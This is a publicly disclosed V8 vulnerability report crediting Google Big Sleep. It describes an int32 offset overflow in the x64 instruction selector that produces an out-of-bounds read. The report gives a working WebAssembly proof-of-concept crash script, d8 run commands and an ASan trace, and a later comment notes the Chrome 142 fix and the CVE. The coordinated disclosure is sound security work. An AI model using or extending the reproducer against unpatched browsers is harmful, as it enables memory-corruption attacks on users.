# 444189152

Issue URL: https://issuetracker.google.com/issues/444189152
VRP-Reward: INT
Date: Sep 10, 2025 10:58PM


_Publishing the original report in line with the disclosure policy._

* * *

We are tracking this issue with the public ID `BIGSLEEP-444189152`. Please use this identifier for reference in any future communication.

## **Vulnerability Details**

The function `TryEmitLoadForLoadWord64AndShiftRight` [1] in the x64 instruction selector is used to optimize code patterns such as `V = Load64(addr); V >>= 32`, i.e. loading a 64-bit value and shifting it to the right by 32. The function optimizes this pattern by instead directly loading only the upper 32 bits of the value from memory. The function proceeds roughly as follows:

  1. It checks if the current operation is a right shift by 32 [2]
  2. It checks if the input is a 64-bit load [3]
  3. It checks if the offset of the memory load fits into an int32 constant [4]
  4. It computes the new offset as `old_offset + 4` and stores it in an int32 [5]
  5. It replaces the load64+shift with the new load32 instruction

The problem here is that the addition in step (4) can overflow, leading to a negative offset and subsequently an out-of-bounds read as indicated by the ASan report attached below.

[1] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/backend/x64/instruction-selector-x64.cc;l=2028;drc=bfbbaaa7a28577fd940f4e01cb3a4c12e9df7d0f](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/backend/x64/instruction-selector-x64.cc;l=2028;drc=bfbbaaa7a28577fd940f4e01cb3a4c12e9df7d0f>)  
[2] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/backend/x64/instruction-selector-x64.cc;l=2036;drc=bfbbaaa7a28577fd940f4e01cb3a4c12e9df7d0f](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/backend/x64/instruction-selector-x64.cc;l=2036;drc=bfbbaaa7a28577fd940f4e01cb3a4c12e9df7d0f>)  
[3] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/backend/x64/instruction-selector-x64.cc;l=2042;drc=bfbbaaa7a28577fd940f4e01cb3a4c12e9df7d0f](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/backend/x64/instruction-selector-x64.cc;l=2042;drc=bfbbaaa7a28577fd940f4e01cb3a4c12e9df7d0f>)  
[4] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/backend/x64/instruction-selector-x64.cc;l=2044;drc=bfbbaaa7a28577fd940f4e01cb3a4c12e9df7d0f](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/backend/x64/instruction-selector-x64.cc;l=2044;drc=bfbbaaa7a28577fd940f4e01cb3a4c12e9df7d0f>)  
[5] [https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/backend/x64/instruction-selector-x64.cc;l=2073;drc=bfbbaaa7a28577fd940f4e01cb3a4c12e9df7d0f](<https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/backend/x64/instruction-selector-x64.cc;l=2073;drc=bfbbaaa7a28577fd940f4e01cb3a4c12e9df7d0f>)

## **Affected Version(s)**

The issue has been successfully reproduced:

  * at HEAD (commit bfbbaaa7a28577fd940f4e01cb3a4c12e9df7d0f)
  * in stable release 14.0.365.4 (commit fdb12b460f148895f6af2ff0e0d870ff8889f154)

## **Reproduction**

### **Test Case**

The testcase requires the [wasm-module-builder.js](<http://wasm-module-builder.js>) which can be copied from [https://source.chromium.org/chromium/chromium/src/+/main:v8/test/mjsunit/wasm/wasm-module-builder.js](<https://source.chromium.org/chromium/chromium/src/+/main:v8/test/mjsunit/wasm/wasm-module-builder.js>)

```
// Flags: --no-liftoff

d8.file.execute("wasm-module-builder.js");

const MEMORY_PAGES = 65535;
const VULN_OFFSET = 0x7FFFFFFC;

const builder = new WasmModuleBuilder();
builder.addMemory(MEMORY_PAGES);
builder.addFunction("vuln_func", kSig_l_v)
    .addBody([
        kExprI32Const, 0,
        kExprI64LoadMem, 3, ...wasmUnsignedLeb(VULN_OFFSET),
        kExprI64Const, 32,
        kExprI64ShrU
    ])
    .exportFunc();

const instance = builder.instantiate();
const vuln_func = instance.exports.vuln_func;
vuln_func();
```

### **Build Instructions**

Follow the instructions at [https://v8.dev/docs/build](<https://v8.dev/docs/build>). The crash was verified on a debug build:

```
gm.py x64.debug
```

### **Command**

```
./out/x64.debug/d8 --no-liftoff crash.js
```

### **ASan Report**

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==489337==ERROR: AddressSanitizer: SEGV on unknown address 0x7a9f80000000 (pc 0x7fad69ef7981 bp 0x7ffd5766e880 sp 0x7ffd5766e868 T0)
==489337==The signal is caused by a READ memory access.
    #0 0x7fad69ef7981  (<unknown module>)
    #1 0x7fad73b17245 in Builtins_JSToWasmWrapperAsm setup-isolate-deserialize.cc
    #2 0x7fad741bc129 in Builtins_JSToWasmWrapper setup-isolate-deserialize.cc
    #3 0x7fad736fc462 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #4 0x7fad736efde6 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #5 0x7fad736efb2a in Builtins_JSEntry setup-isolate-deserialize.cc
    #6 0x7fad7519f1e6 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) src/execution/simulator.h:212:12
    #7 0x7fad7519781e in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:442:22
    #8 0x7fad751986c6 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) src/execution/execution.cc:542:10
    #9 0x7fad7452c7b8 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) src/api/api.cc:1937:7
    #10 0x7fad7452c03d in v8::Script::Run(v8::Local<v8::Context>) src/api/api.cc:1901:10
    #11 0x561440e4ca55 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) src/d8/d8.cc:1033:44
    #12 0x561440e8327b in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:5351:10
    #13 0x561440e8f210 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) src/d8/d8.cc:6307:37
    #14 0x561440e8eaae in v8::Shell::RunMain(v8::Isolate*, bool) src/d8/d8.cc:6215:18
    #15 0x561440e918ef in v8::Shell::Main(int, char**) src/d8/d8.cc:7100:18
    #16 0x561440e92341 in main src/d8/d8.cc:7192:43
    #17 0x7fad68633ca7 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
==489337==Register values:
rax = 0x0000000000000116  rbx = 0x00000000000000da  rcx = 0x00000000000000be  rdx = 0x00007aa000000000  
rdi = 0x00007bad66594180  rsi = 0x00007a8c00105d65  rbp = 0x00007ffd5766e880  rsp = 0x00007ffd5766e868  
 r8 = 0x00000f75accbf424   r9 = 0x00007a9d0000049d  r10 = 0x00000000ffffffff  r11 = 0x0000000000000000  
r12 = 0x00007ffd5766ea29  r13 = 0x00007ebd677e1080  r14 = 0x00007a9d00000000  r15 = 0x00007fad69ef7000  
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (<unknown module>) 
==489337==ABORTING
```

## **Reporter Credit**

Google Big Sleep

## **Disclosure Policy**

This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 30 days after the fix was made available. Otherwise, this bug report will become public at the deadline. The scheduled deadline is `2025-12-09`.

For more information, visit [https://goo.gle/bigsleep](<https://goo.gle/bigsleep>)


---

**#2 — gl...@google.com — Nov 11, 2025 05:34AM**

This issue was fixed in the 2025-10-28 Chrome 142.0.7444.59 release ([https://chromereleases.googleblog.com/2025/10/stable-channel-update-for-desktop_28.html](<https://chromereleases.googleblog.com/2025/10/stable-channel-update-for-desktop_28.html>)) and assigned CVE-2025-12441.
